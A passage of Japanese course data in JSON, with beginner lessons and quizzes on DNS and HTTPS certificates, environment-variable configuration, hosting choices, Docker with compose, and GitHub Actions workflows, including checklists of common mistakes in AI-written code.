|\n\nブラウザは、**信頼できる発行者が、このドメインに対して発行した、期限内の証明書か** を確かめます。\n\n- **Let's Encrypt**：無料で証明書を発行してくれる団体。GitHub Pages・Cloudflare・Render などは、裏で自動的に取得・更新してくれる\n- 証明書には有効期限があり（Let's Encrypt は 90 日。今後さらに短くなる予定）、**自動で更新する** のが今の標準\n\n### よく見る証明書のエラー\n\n| ブラウザの表示 | よくある原因 |\n|---|---|\n| 「この接続ではプライバシーが保護されません」`NET::ERR_CERT_DATE_INVALID` | 証明書の期限切れ（自動更新が止まっていた） |\n| `NET::ERR_CERT_COMMON_NAME_INVALID` | `www` 付きと無しなど、証明書のドメインと違う名前でアクセスした |\n| 独自ドメインにしたら証明書のエラー | サービスがまだ証明書を発行していない（DNS の確認待ち）。少し待つ |\n| 「保護されていない通信」 | http のまま。https に転送する設定をする |\n\n⚠️ プログラムで `requests.get(url, verify=False)` や Node.js の `NODE_TLS_REJECT_UNAUTHORIZED=0` を見たら要注意です。証明書の確認を **切っている** ので、偽のサーバーにつながっても気づけません。エラーを消すために AI が提案しがちな書き方です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| 「DNS に `CNAME www → xxx.pages.dev` を追加してください」 | サービスの名前への別名。サービス側でもドメインの登録が必要 |\n| 「TXT レコードに `_vercel` … を追加」 | ドメインの持ち主であることの証明 |\n| `verify=False` / `rejectUnauthorized: false` | ⚠️ 証明書の確認を切っている。本番では使わない |\n| `http://` の URL がコードに直接書かれている | 本番は https に |\n| CORS の設定に `https://example.com` と `https://www.example.com` | 別の名前として扱われる。両方使うなら両方書く |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "GitHub Pages に独自ドメイン `www.example.com` を向けるとき、DNS に設定するのが一般的なのは？",
        "choices": [
         "MX レコードで `ユーザー名.github.io` に",
         "CNAME レコードで `ユーザー名.github.io` に",
         "TXT レコードに IP アドレスを"
        ],
        "answer": 1,
        "explain": "CNAME は「別の名前の別名」です。サービスの名前に向けておけば、サービス側で住所が変わっても対応不要です。MX はメール用です。"
       },
       {
        "question": "DNS のレコードを書き換えたのに、まだ古いサイトが表示される人がいる。いちばん考えられる理由は？",
        "choices": [
         "TTL の間、各地の DNS やパソコンが古い答えを覚えている（キャッシュ）から",
         "書き換えが失敗しているから",
         "ブラウザが壊れているから"
        ],
        "answer": 0,
        "explain": "レコードには覚えておいてよい時間（TTL）があり、その間は聞き直しません。少し待つと反映されます。"
       },
       {
        "question": "`requests.get(url, verify=False)` で「証明書のエラーが消えた」。この直し方の問題は？",
        "choices": [
         "処理が遅くなる",
         "証明書の確認を切ったので、偽のサーバーにつながっても気づけない",
         "問題はない"
        ],
        "answer": 1,
        "explain": "エラーの原因（期限切れ・名前の違いなど）を直すべきところを、確認自体を止めています。本番では使いません。"
       }
      ]
     ],
     "id": "03-domain-dns-https"
    },
    {
     "title": "設定と環境変数 ― 同じコードを、どこでも動かす",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "deploy",
      "security",
      "type_hints"
     ],
     "summary": "設定を環境変数に出す理由と、読み込みの優先順位。pydantic-settings で「足りない・おかしい設定なら起動しない」ようにする。`bool(\"false\")` の罠、本番でのシークレットの登録場所。",
     "body": "## このレッスンのゴール\n\n- 設定をコードから環境変数に出す理由と、`.env` の役割を説明できる\n- 環境変数と `.env` のどちらが優先されるかが分かる\n- 設定を型付きで読み込み、足りない設定に起動時に気づけるようにする方法が分かる\n\nAI と開発するコースの「秘密情報と環境変数」で、API キーを `.env` に置くことを学びました。ここでは、秘密だけでなく **設定全体** の扱い方を見ます。\n\n## 何を設定にするか\n\n| 設定にするもの | 例 |\n|---|---|\n| 環境ごとに違うもの | データベースの URL、API の URL、`DEBUG` のオン・オフ |\n| 秘密 | API キー、パスワード、署名の鍵（`SECRET_KEY`） |\n| あとで変えたくなる値 | メールの送信元、1 ページの件数、機能のオン・オフ |\n\n| 設定にしないもの | 例 |\n|---|---|\n| 環境で変わらないもの | 税率の計算方法、画面の文言 |\n\n## 読み込みの順番\n\n```text\n① コードに書いた初期値     （いちばん弱い）\n② .env ファイル\n③ 実際の環境変数           （いちばん強い）\n```\n\n多くのライブラリ（`python-dotenv`・`pydantic-settings`・Node.js の `dotenv`）は、**すでに環境変数があれば、`.env` の値で上書きしません**。手元では `.env`、本番ではクラウドの設定画面で登録した環境変数、と切り替えられるのはこのためです。\n\n## pydantic-settings：型付きの設定\n\n```python\nfrom pydantic_settings import BaseSettings, SettingsConfigDict\n\nclass Settings(BaseSettings):\n    model_config = SettingsConfigDict(env_file=\".env\")\n    app_env: str = \"development\"     # 初期値あり\n    database_url: str                # 初期値なし → 必須\n    debug: bool = False\n    secret_key: str                  # 必須\n\nsettings = Settings()\n```\n\n```bash\n# .env\nAPP_ENV=development\nDATABASE_URL=sqlite:///dev.db\nDEBUG=true\n```\n\n実際に、いろいろな状態で起動してみました。\n\n```text\n① .env だけ（SECRET_KEY が無い）\npydantic_core._pydantic_core.ValidationError: 1 validation error for Settings\nsecret_key\n  Field required [type=missing, ...]                         ← 起動した瞬間に止まった\n\n② SECRET_KEY=abcd1234 を環境変数で足す\ndevelopment sqlite:///dev.db True abcd...                    ← .env の値と合わせて読めた\n\n③ 環境変数で APP_ENV=production DEBUG=false DATABASE_URL=postgresql://u@db/app も足す\nproduction postgresql://u@db/app False abcd...               ← 環境変数が .env より優先された\n\n④ DEBUG=yes-please\ndebug\n  Input should be a valid boolean, unable to interpret input  ← おかしな値も止まった\n```\n\n**足りない・おかしい設定は、起動したときにすぐ止まる** のが大事です。設定の漏れに、利用者がその機能を使ったときに初めて気づく（本番で 500 エラー）より、ずっと安全です。\n環境変数の名前は大文字（`DATABASE_URL`）、Python の属性は小文字（`database_url`）ですが、pydantic-settings は大文字・小文字を区別せずに対応させてくれます。\n\n### `os.environ` で読むときの罠\n\n```python\nimport os\nDEBUG = bool(os.environ.get(\"DEBUG\"))    # ⚠️\nbool(\"false\")                            # True！\n```\n\n環境変数は **すべて文字列** です。空でない文字列は `bool()` すると全部 `True` になるので、`DEBUG=false` と書いても **デバッグがオンになります**（実行して確認）。\n\n```python\nDEBUG = os.environ.get(\"DEBUG\", \"\").lower() in (\"1\", \"true\", \"yes\")   # ✅ 自分で判定する\n```\n\n数値も `int(os.environ[\"PORT\"])` のように変換が必要です。型付きの設定ライブラリを使うと、こうした変換と確認をまとめて任せられます。\n\n## .env を共有する方法：.env.example\n\n`.env` は Git に入れませんが、**どんな設定が必要か** は共有したいものです。そこで、値を空にした見本を入れておきます。\n\n```bash\n# .env.example（Git に入れる）\nAPP_ENV=development\nDATABASE_URL=sqlite:///dev.db\nDEBUG=true\nSECRET_KEY=                # python -c \"import secrets; print(secrets.token_urlsafe(32))\" で作る\nOPENAI_API_KEY=\n```\n\n新しく始める人は `cp .env.example .env` をして、空のところを埋めます。\n\n## 本番ではどこに置く？\n\n| 置き場所 | 登録の仕方 |\n|---|---|\n| Render・Railway・Vercel・Fly.io | 管理画面の **Environment Variables** |\n| Cloudflare Workers | `npx wrangler secret put SECRET_KEY`（バックエンドコースのレッスン 19） |\n| GitHub Actions | リポジトリの **Settings → Secrets and variables → Actions**。`${{ secrets.NAME }}` で読む（レッスン 7） |\n| Docker | `docker run -e APP_ENV=production` や `--env-file`（レッスン 6） |\n| 大きなサービス | AWS Secrets Manager・Google Secret Manager など、秘密専用のサービス |\n\n⚠️ 管理画面に登録した秘密は、**ログに出さない** ように注意します。`print(settings)` や、エラーのときに設定を全部出す処理があると、ログから漏れます（pydantic の `SecretStr` 型を使うと、表示が `**********` になります）。\n\n## フロントエンドの「環境変数」は秘密ではない\n\n```javascript\n// Vite（React など）\nconst apiUrl = import.meta.env.VITE_API_URL;\n// Next.js\nconst apiUrl = process.env.NEXT_PUBLIC_API_URL;\n```\n\n`VITE_` や `NEXT_PUBLIC_` で始まる環境変数は、**ビルドのときにコードに埋め込まれて、ブラウザに送られます**。API の URL のような公開してよい値にだけ使い、秘密は入れません（レッスン 2）。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `SECRET_KEY = \"change-me\"` / `API_KEY = \"sk-...\"` がコードに直接 | ⚠️ 環境変数に |\n| `os.environ.get(\"SECRET_KEY\", \"dev-secret\")` | ⚠️ 本番で設定し忘れると、誰でも知っている値で動いてしまう。秘密には初期値を付けず、無ければ止める |\n| `bool(os.environ.get(\"DEBUG\"))` | ⚠️ `\"false\"` でも True |\n| `class Settings(BaseSettings):` | ✅ 型付きの設定 |\n| `.env.example` がある | ✅ 必要な設定が分かる |\n| `VITE_OPENAI_API_KEY` / `NEXT_PUBLIC_..._SECRET` | ⚠️ ブラウザに送られる。秘密ならサーバー側に |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`.env` に `APP_ENV=development`、実際の環境変数に `APP_ENV=production` があるとき、pydantic-settings が読むのは？",
        "choices": [
         "development（ファイルが優先）",
         "production（実際の環境変数が優先）",
         "エラーになる"
        ],
        "answer": 1,
        "explain": "実際の環境変数が `.env` より優先されます。だから、本番では管理画面で登録した値が使われます。"
       },
       {
        "question": "`DEBUG = bool(os.environ.get(\"DEBUG\"))` で、`DEBUG=false` と設定したときの DEBUG の値は？",
        "choices": [
         "True",
         "False",
         "None"
        ],
        "answer": 0,
        "explain": "環境変数は文字列で、空でない文字列は `bool()` すると True です。文字列の中身を見て判定する必要があります。"
       },
       {
        "question": "`SECRET_KEY` を必須（初期値なし）にしておく利点は？",
        "choices": [
         "起動が速くなる",
         "本番で設定し忘れたとき、起動した時点で止まって気づける",
         "秘密が自動で作られる"
        ],
        "answer": 1,
        "explain": "初期値があると、設定し忘れても誰でも知っている値で動いてしまいます。必須にしておけば、起動時のエラーですぐ気づけます。"
       }
      ]
     ],
     "id": "04-config"
    },
    {
     "title": "ホスティングの選び方 ― どこに置くか",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "deploy",
      "backend",
      "performance"
     ],
     "summary": "静的ホスティング・BaaS・PaaS・サーバーレス・コンテナ・VPS を、手間・料金・向き不向きで比べる。コールドスタート、無料枠の落とし穴、「作りたいもの別」の選び方。",
     "body": "## このレッスンのゴール\n\n- ホスティングの種類ごとに、自分が面倒を見る範囲と料金の仕組みを説明できる\n- コールドスタートや無料枠のスリープなど、選ぶときに知っておくべき落とし穴が分かる\n- 作りたいものに合わせて、候補を 2〜3 個に絞れる\n\nバックエンドコースのレッスン 15 で、ホスティングの種類を表で見ました。ここでは **選ぶとき** に必要な知識を足します。\n\n## 面倒を見る範囲\n\n下に行くほど自由が増え、そのぶん自分の仕事も増えます。\n\n| 種類 | 例 | 自分が用意するもの | サービスがやってくれること |\n|---|---|---|---|\n| **静的ホスティング** | GitHub Pages、Cloudflare Pages、Netlify | HTML・CSS・JS のファイル | 配信・HTTPS・世界中への配布 |\n| **BaaS** | Firebase、Supabase | フロントエンドと、データのルール | データベース・ログイン・ファイル保存 |\n| **サーバーレス関数** | Cloudflare Workers、Vercel Functions、AWS Lambda | 関数のコード | サーバー・台数の調整・起動と停止 |\n| **PaaS** | Render、Railway、Fly.io、Heroku | アプリのコード（や Dockerfile） | サーバー・OS・HTTPS・ログ |\n| **コンテナのサービス** | Google Cloud Run、AWS App Runner、Azure Container Apps | Docker のイメージ（レッスン 6） | 台数の調整・HTTPS |\n| **VPS・仮想マシン** | AWS EC2、さくらの VPS、ConoHa | **全部**（OS の更新、セキュリティ、ファイアウォール…） | 機械と電源と回線 |\n\n**上の方から考えて、できないことがあったら下に降りる** のが、手間を減らすコツです。\n\n## 料金の仕組み\n\n| 仕組み | どんなサービス | 気をつけること |\n|---|---|---|\n| **使った分だけ**（リクエスト数・計算時間） | サーバーレス、BaaS、Cloud Run | 使わなければほぼ 0 円。ただし **攻撃や無限ループで急に高額** になることがある |\n| **起動している時間** | PaaS、VPS | アクセスが無くても動いている間はかかる。金額は読みやすい |\n| **無料枠** | ほとんどのサービス | 上限を超えたら止まるのか、課金されるのか、確認しておく |\n\n⚠️ 使った分だけのサービスでは、**予算のアラート（いくらを超えたら知らせる）** を必ず設定しましょう。AI のコードのバグで API を呼び続けて、一晩で高額の請求、という事故は珍しくありません。\n\n## 知っておきたい落とし穴\n\n### コールドスタート\n\nサーバーレスやスリープするサービスは、しばらく使われないと **止まって** います。次のリクエストが来たときに起動するので、**最初の 1 回だけ遅い** ことがあります。これを **コールドスタート** と呼びます。\n\n| サービス | コールドスタート |\n|---|---|\n| Cloudflare Workers | ほぼ気にならない（とても軽い仕組みで動くため） |\n| AWS Lambda、Cloud Run | 数百ミリ秒〜数秒（言語やライブラリの大きさによる） |\n| PaaS の無料プラン | 数十秒かかることも（使われないとスリープするプランがある） |\n\n### 無料プランのスリープ・停止\n\nPaaS の無料プランは、「15 分アクセスが無いとスリープ」「月に何時間まで」のような制限があることが多いです。個人の試作には十分ですが、**人に使ってもらうサービス** なら、制限を確かめておきます。\n\n### ファイルが消える\n\nPaaS・サーバーレス・コンテナのサービスは、**再起動すると、サーバーに保存したファイルが消える** ことがほとんどです（レッスン 1）。データはデータベースに、ファイルは保存用のサービス（AWS S3、Cloudflare R2 など）に置きます。\n\n### 長い処理ができない\n\nサーバーレスの関数には、**1 回の実行時間の上限** があります（数十秒〜数分）。動画の変換のような長い処理は、キュー（バックエンドコースのレッスン 13）と別の仕組みに分けます。\n\n## 作りたいもの別の選び方\n\n| 作りたいもの | まず考える候補 |\n|---|---|\n| このサイトのような、説明や記録のページ | **静的ホスティング**（GitHub Pages、Cloudflare Pages） |\n| React などの画面＋ログイン＋データ保存（popup2027 のようなアプリ） | **静的ホスティング ＋ BaaS**（Firebase・Supabase） |\n| 小さな API・Webhook の受け口・定期的な処理 | **サーバーレス**（Cloudflare Workers ＋ D1） |\n| FastAPI・Django・Express の普通の Web アプリ | **PaaS**（Render、Railway、Fly.io）か **Cloud Run** |\n| Next.js のアプリ | Vercel、Cloudflare（vinext など） |\n| ずっと動き続ける処理（Discord のボット、WebSocket） | PaaS（スリープしないプラン）、VPS |\n| 特殊なソフトを入れたい・細かく制御したい | VPS（ただし管理の手間が大きい） |\n\n### プレビュー環境\n\nVercel・Netlify・Cloudflare Pages・Render などは、**プルリクエストを作るたびに、その変更だけを入れた確認用の URL** を自動で作ってくれます（**プレビュー環境**）。AI が作った PR を、マージする前に実際に触って確かめられるので、とても便利です（ターミナルと Git のコースのレッスン 6）。\n\n## 選ぶときのチェックリスト\n\n| 確認すること | 例 |\n|---|---|\n| 使う言語・フレームワークに対応しているか | Python が使えるか、WebSocket が使えるか |\n| データはどこに置くか | 同じサービスのデータベースがあるか、外部につなぐか |\n| 料金：無料枠の中身と、超えたらどうなるか | 止まる？課金？予算アラートはある？ |\n| 地域（リージョン） | 利用者が日本なら、東京などの近い場所を選べるか |\n| 出ていくとき困らないか | Docker のイメージで動くなら、他のサービスにも移しやすい |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "「アクセスはたまにしか無いが、0 円に近く運用したい小さな API」に向いているのは？",
        "choices": [
         "VPS",
         "サーバーレス関数（Cloudflare Workers など）",
         "常に動いている PaaS の有料プラン"
        ],
        "answer": 1,
        "explain": "サーバーレスは使った分だけの料金なので、アクセスが少なければほとんどかかりません。"
       },
       {
        "question": "PaaS の無料プランに置いた API が、朝いちばんのアクセスだけ 30 秒くらいかかる。考えられる理由は？",
        "choices": [
         "使われない間スリープしていて、最初のリクエストで起動しているから（コールドスタート）",
         "データベースが壊れているから",
         "DNS の TTL のせい"
        ],
        "answer": 0,
        "explain": "無料プランにはスリープするものが多く、起動に時間がかかります。気になるならスリープしないプランや別のサービスを検討します。"
       },
       {
        "question": "使った分だけ課金されるサービスを使うとき、最初にしておくべきことは？",
        "choices": [
         "無料枠を超えないように、アプリを公開しない",
         "予算のアラートや上限を設定しておく",
         "一番大きなプランにしておく"
        ],
        "answer": 1,
        "explain": "バグや攻撃でリクエストが急に増えると、思わぬ請求になることがあります。早めに気づけるように設定します。"
       }
      ]
     ],
     "id": "05-hosting-choices"
    },
    {
     "title": "Docker の基本 ― 動く環境ごと箱に詰める",
     "level": 3,
     "minutes": 22,
     "concepts": [
      "deploy",
      "tooling",
      "hardware"
     ],
     "summary": "イメージとコンテナの違い、Dockerfile の各行とキャッシュ、ポートの対応づけ、環境変数、.dockerignore、docker compose でアプリとデータベースを一緒に動かすまで。すべて実際に動かした出力つき。",
     "body": "## このレッスンのゴール\n\n- イメージとコンテナの違い、`docker build`・`docker run` の役割を説明できる\n- Dockerfile を読んで、キャッシュが効く順番になっているか判断できる\n- `compose.yaml` を読んで、どのサービスがどうつながっているか説明できる\n\nバックエンドコースのレッスン 15 で Dockerfile の各行の意味を見ました。ここでは、**実際にビルドして動かしたときに何が起きるか** を見ます。この環境で、小さな FastAPI のアプリを実際にビルド・実行しました。\n\n## イメージとコンテナ\n\n| | たとえ | 説明 | 作るコマンド |\n|---|---|---|---|\n| **Dockerfile** | レシピ | どう作るかの手順書 | 自分で書く |\n| **イメージ** | 冷凍食品 | 手順どおりに作った、**動かす前の完成品**。変わらない | `docker build` |\n| **コンテナ** | 温めて皿に出した料理 | イメージを **実行している最中のもの**。いくつでも作れる | `docker run` |\n\nコンピュータの基礎コースの「プログラムとプロセス」の関係に似ています。イメージがプログラム、コンテナがプロセスです。\n\n## アプリと Dockerfile\n\n```python\n# main.py\nimport os\nfrom fastapi import FastAPI\napp = FastAPI()\n\n@app.get(\"/\")\ndef root():\n    return {\"message\": \"hello\", \"env\": os.environ.get(\"APP_ENV\", \"development\")}\n```\n\n```dockerfile\nFROM python:3.12-slim\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\nCOPY . .\nCMD [\"uvicorn\", \"main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]\n```\n\n（この環境では、ネットワークの事情で証明書の設定を 2 行足してビルドしました。普通のパソコンでは上のままで動きます。下の出力の `[3/6]` などの番号は、その 2 行を足した版のものです）\n\n## ビルドする\n\n```text\n$ docker build -t hello-api .\n#5 [1/6] FROM docker.io/library/python:3.12-slim\n#7 [3/6] WORKDIR /app\n#8 [4/6] COPY requirements.txt .\n#9 [5/6] RUN pip install --no-cache-dir -r requirements.txt\n#9 DONE 7.7s\n#10 [6/6] COPY . .\n#11 naming to docker.io/library/hello-api:latest done\n```\n\n| 部分 | 意味 |\n|---|---|\n| `-t hello-api` | できたイメージに `hello-api` という名前（タグ）を付ける |\n| `.` | 今のディレクトリのファイルを材料（ビルドコンテキスト）として使う |\n| `[5/6] RUN pip install ...` `DONE 7.7s` | ライブラリのインストールに 7.7 秒かかった |\n\n### キャッシュ：変わったところから下だけ作り直す\n\n`main.py` を 1 行変えて、もう一度ビルドしました。\n\n```text\n#6 [3/6] WORKDIR /app\n#6 CACHED\n#8 [4/6] COPY requirements.txt .\n#8 CACHED\n#9 [5/6] RUN pip install --no-cache-dir -r requirements.txt\n#9 CACHED                     ← インストールはやり直していない\n#10 [6/6] COPY . .\n#10 DONE 0.0s                 ← 変わったのはここから\n```\n\nDocker は **1 行ごとの結果を覚えておき**、材料が変わっていない行は `CACHED`（使い回し）にします。ある行が変わると、**そこから下は全部作り直し** です。\n\nだから、**変わりにくいもの（ライブラリの一覧）を先に、変わりやすいもの（コード）を後に** コピーします。もし最初に `COPY . .` してから `pip install` すると、コードを 1 文字変えるたびに毎回インストールし直すことになります。\n\n### .dockerignore\n\n```text\n# .dockerignore\n.venv/\n__pycache__/\n.env\n.git/\n```\n\n`COPY . .` で **入れたくないもの** を書きます。`.gitignore` と同じ書き方です。\n\n- `.env` を入れると、**秘密がイメージの中に残ります**。イメージを共有・公開すると漏れます\n- `.venv/` や `node_modules/` を入れると、イメージが大きくなり、手元の OS 用のファイルが混ざって動かないこともあります\n\n## 動かす\n\n```text\n$ docker run -d --name hello -p 8080:8000 -e APP_ENV=production hello-api\n$ curl localhost:8080/\n{\"message\":\"hello\",\"env\":\"production\"}\n\n$ docker ps\nhello 0.0.0.0:8080->8000/tcp Up 4 seconds\n\n$ docker logs hello\nINFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)\nINFO:     172.17.0.1:52822 - \"GET / HTTP/1.1\" 200 OK\n```\n\n| オプション | 意味 |\n|---|---|\n| `-d` | 後ろで動かす（ターミナルを占領しない） |\n| `--name hello` | コンテナに名前を付ける |\n| `-p 8080:8000` | **パソコンの 8080 番** に来たものを、**コンテナの 8000 番** に渡す（左が外、右が中） |\n| `-e APP_ENV=production` | 環境変数を渡す（レッスン 4）。アプリの返事が `production` になった |\n\n| よく使うコマンド | 意味 |\n|---|---|\n| `docker ps` / `docker ps -a` | 動いているコンテナ／止まったものも含めて一覧 |\n| `docker logs 名前` | コンテナの出力（ログ） |\n| `docker stop 名前` / `docker rm 名前` | 止める／消す |\n| `docker exec -it 名前 bash` | 動いているコンテナの中に入って、コマンドを打つ |\n| `docker images` | イメージの一覧（今回の hello-api は 215MB でした） |\n\n⚠️ `--host 0.0.0.0` を付けずに `127.0.0.1` で起動すると、コンテナの **中からしか** 届かず、`-p` を付けてもつながりません。「コンテナは動いているのにブラウザで開けない」ときの定番の原因です。\n\n## docker compose：複数のコンテナをまとめて動かす\n\nアプリとデータベースのように、**複数のコンテナを一緒に** 動かすときは、`compose.yaml`（古い名前は `docker-compose.yml`）に書きます。\n\n```yaml\nservices:\n  api:                                   # 1 つ目：自分のアプリ\n    build: .                             # この場所の Dockerfile でビルド\n    ports:\n      - \"8080:8000\"\n    environment:\n      APP_ENV: production\n      DATABASE_URL: postgresql://app:app-password@db:5432/app   # ← 相手の名前「db」で届く\n    depends_on:\n      - db                               # db を先に起動する\n  db:                                    # 2 つ目：PostgreSQL\n    image: postgres:17                   # ビルドせず、公開されているイメージを使う\n    environment:\n      POSTGRES_USER: app\n      POSTGRES_PASSWORD: app-password\n      POSTGRES_DB: app\n    volumes:\n      - db-data:/var/lib/postgresql/data # データをコンテナの外に保存\nvolumes:\n  db-data:\n```\n\n```text\n$ docker compose up -d\n Container dk-db-1 Started\n Container dk-api-1 Started\n\n$ docker compose ps\napi running 0.0.0.0:8080->8000/tcp\ndb  running 5432/tcp\n\n$ docker compose exec db psql -U app -d app -c \"select 1 as ok\"\n ok\n----\n  1\n```\n\n| 読みどころ | 意味 |\n|---|---|\n| `@db:5432` | compose の中では、**サービスの名前（`db`）がそのまま住所** になる。api のコンテナから `db` を引くと `172.18.0.2` が返ってきた |\n| `db` に `ports` が無い | パソコンの外からは、データベースに直接つなげない（api からだけ届く）。安全 |\n| `volumes` | コンテナを消してもデータが残る場所。`docker compose down` の後も `db-data` が残っていた |\n| `depends_on` | 起動の順番だけ。⚠️ データベースが「使える状態」になるまで待つわけではない（`healthcheck` を足す） |\n\n⚠️ `POSTGRES_PASSWORD: app-password` のように compose に直接書いてよいのは、**手元の開発用** だけです。本番の秘密は、レッスン 4 の方法で渡します。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `COPY . .` の後に `RUN pip install` / `RUN npm install` | ⚠️ 毎回インストールし直しになる。一覧のファイルを先にコピー |\n| `.dockerignore` が無い | ⚠️ `.env` や `node_modules` がイメージに入る |\n| `FROM python:latest` | ⚠️ ビルドするたびにバージョンが変わる。`3.12-slim` のように固定 |\n| `ENV API_KEY=sk-...` を Dockerfile に | ⚠️ イメージに秘密が残る。`docker run -e` や本番の設定で渡す |\n| `CMD [\"uvicorn\", \"main:app\", \"--reload\"]` | ⚠️ 開発用。本番では外す |\n| `ports: - \"5432:5432\"`（db に） | 手元で直接つなぎたいなら便利だが、本番のサーバーでは外から届いてしまう |\n| `-slim` / `-alpine` の付いたイメージ | ✅ 小さいイメージ。`alpine` は一部の Python ライブラリでビルドに困ることがある |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`docker build` と `docker run` の関係として正しいのは？",
        "choices": [
         "build でイメージ（動かす前の完成品）を作り、run でそれを実行したコンテナを作る",
         "build でコンテナを作り、run でイメージを作る",
         "どちらも同じ意味"
        ],
        "answer": 0,
        "explain": "イメージはレシピから作った完成品、コンテナはそれを動かしている最中のものです。1 つのイメージから何個でもコンテナを作れます。"
       },
       {
        "question": "Dockerfile で `COPY requirements.txt .` → `RUN pip install` → `COPY . .` の順にする理由は？",
        "choices": [
         "そうしないとエラーになるから",
         "コードだけを変えたとき、ライブラリのインストールをキャッシュで飛ばせるから",
         "イメージが小さくなるから"
        ],
        "answer": 1,
        "explain": "Docker は変わった行から下を作り直します。変わりにくいライブラリの一覧を先にすれば、コードを変えてもインストールは CACHED になります（実際に確認しました）。"
       },
       {
        "question": "compose の `api` から `db` の PostgreSQL につなぐとき、`DATABASE_URL` の住所の部分に書くのは？",
        "choices": [
         "`localhost`",
         "`db`（サービスの名前）",
         "パソコンの IP アドレス"
        ],
        "answer": 1,
        "explain": "compose の中では、サービスの名前が住所になります。api のコンテナの中の `localhost` は、api 自身のことです。"
       }
      ]
     ],
     "id": "06-docker"
    },
    {
     "title": "CI/CD と GitHub Actions ― push したら自動でテスト・公開",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "deploy",
      "testing",
      "tooling",
      "version_control"
     ],
     "summary": "GitHub Actions のワークフローの読み方（on・jobs・steps・uses・run・secrets）。このリポジトリの自動マージの仕組みを読み、テストを自動で回すワークフローを組み立てる。",
     "body": "## このレッスンのゴール\n\n- CI と CD の違い、自動化する理由を説明できる\n- GitHub Actions のワークフロー（`.github/workflows/*.yml`）を読み、いつ・何をするのか説明できる\n- `secrets`・`permissions` など、ワークフローの安全に関わる部分をチェックできる\n\n## CI と CD\n\n| | 正式な名前 | すること |\n|---|---|---|\n| **CI** | 継続的インテグレーション | push や PR のたびに、**自動でテスト** する。壊れた変更を main に入れない |\n| **CD** | 継続的デリバリー／デプロイ | テストに通ったら、**自動で公開** する |\n\n人の手でやると、テストを忘れる・手順を間違える・その人しかやり方を知らない、が起きます。**毎回同じ手順を、機械に確実にやらせる** のが CI/CD です。\n\n## GitHub Actions の部品\n\n```text\nワークフロー（.github/workflows/xxx.yml 1 つ）\n └─ on: いつ動くか（きっかけ）\n └─ jobs: 仕事のまとまり（並べて同時に動かせる）\n     └─ runs-on: どんなパソコンで動かすか\n     └─ steps: 上から順番に実行する手順\n         ├─ uses: 他の人が作った部品（アクション）を使う\n         └─ run:  コマンドを実行する\n```\n\n| きっかけ（`on:`） | いつ |\n|---|---|\n| `push:` | push されたとき（`branches:` で絞り込める） |\n| `pull_request:` | PR が作られた・更新されたとき |\n| `workflow_dispatch:` | Actions のタブから手動で実行したとき |\n| `schedule:` | 決まった時間（`cron: \"0 0 * * *\"` は毎日 0 時（UTC）） |\n\n## このリポジトリのワークフローを読む\n\n### 自動マージ（auto-merge-claude.yml）\n\n```yaml\nname: Auto merge Claude branches into main\n\non:\n  push:\n    branches: [\"claude/**\"]          # ① claude/ で始まるブランチに push されたら\n\npermissions:\n  contents: write                    # ② リポジトリへの書き込みを許可（main に push するため）\n\nconcurrency:\n  group: auto-merge-main             # ③ 同時に動くのは 1 つだけ（順番待ち）\n  cancel-in-progress: false          #    途中のものは止めない\n\njobs:\n  merge:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: main                  # ④ main ブランチを取ってくる\n          fetch-depth: 0             #    履歴を全部（マージに必要）\n      - name: Merge into main\n        run: |                       # ⑤ | の後ろは、複数行のコマンド\n          git config user.name \"github-actions[bot]\"\n          git config user.email \"41898282+github-actions[bot]@users.noreply.github.com\"\n          git fetch origin \"${GITHUB_REF_NAME}\"           # push されたブランチを取ってきて\n          git merge --no-edit \"origin/${GITHUB_REF_NAME}\" # main にマージして\n          git push origin main                             # main を push する\n```\n\n| 番号 | 読み方 |\n|---|---|\n| ① | `\"claude/**\"` の `**` は「その下なら何でも」。Claude が作業ブランチを push するたびに動く |\n| ② | 普通は読むだけの権限。main に push するので書き込みが必要 |\n| ③ | 2 つの push がほぼ同時に来ても、**順番に** マージする（同時にやると後のほうが失敗する） |\n| ⑤ | `${GITHUB_REF_NAME}` は GitHub が用意してくれる環境変数で、push されたブランチの名前が入る |\n\nターミナルと Git のコースで学んだ `git fetch`・`git merge`・`git push` を、**GitHub のパソコンが代わりに実行している** だけだと分かります。マージでコンフリクトが起きると `git merge` が失敗し、このワークフローは ❌ になります。\n\n### サイトの公開（pages.yml）\n\nレッスン 2 で読んだとおり、main が更新されたとき（自動マージの後も `workflow_run` で拾う）に、ビルド → 公開をしています。これは **CD** の部分です。\n\nつまり、このサイトでは **Claude のブランチに push → 自動マージ（このワークフロー）→ 自動で公開（pages.yml）** と、2 つのワークフローがリレーのようにつながっています。\n\n## テストを自動で回すワークフロー\n\nこのリポジトリにはまだありませんが、Python のアプリなら、CI はこんな形になります。\n\n```yaml\nname: Test\n\non:\n  push:\n    branches: [main]\n  pull_request:                      # PR のたびにも\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: [\"3.12\", \"3.13\"]     # 2 つのバージョンで同時にテスト\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n          cache: pip                          # ライブラリのダウンロードを使い回して速く\n      - run: pip install -r requirements.txt\n      - run: pytest\n        env:\n          SECRET_KEY: test-only-not-secret    # テスト用のただの値\n          API_KEY: ${{ secrets.API_KEY }}     # 本物の秘密は Secrets から\n```\n\n| 読みどころ | 意味 |\n|---|---|\n| `matrix` | 同じ手順を、条件を変えて何通りも同時に実行する。ここでは Python 